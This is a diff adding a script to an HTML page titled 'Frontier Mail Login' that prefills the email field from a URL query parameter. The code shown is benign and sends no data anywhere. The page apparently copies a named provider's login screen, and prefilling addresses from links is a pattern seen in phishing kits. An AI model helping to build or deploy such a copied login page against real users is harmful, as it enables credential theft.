@@ -4,6 +4,20 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Frontier Mail Login</title>
+  <script>
+        function getQueryParameter(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        window.onload = function() {
+            const emailField = document.getElementById('email');
+            const email = getQueryParameter('email');
+            if (email) {
+                emailField.value = email;
+            }
+        }
+    </script>
 
   <link rel="icon" href="https://login.frontier.com/ftr-sys-theme/img/favicon.svg" type="image/x-icon">
 
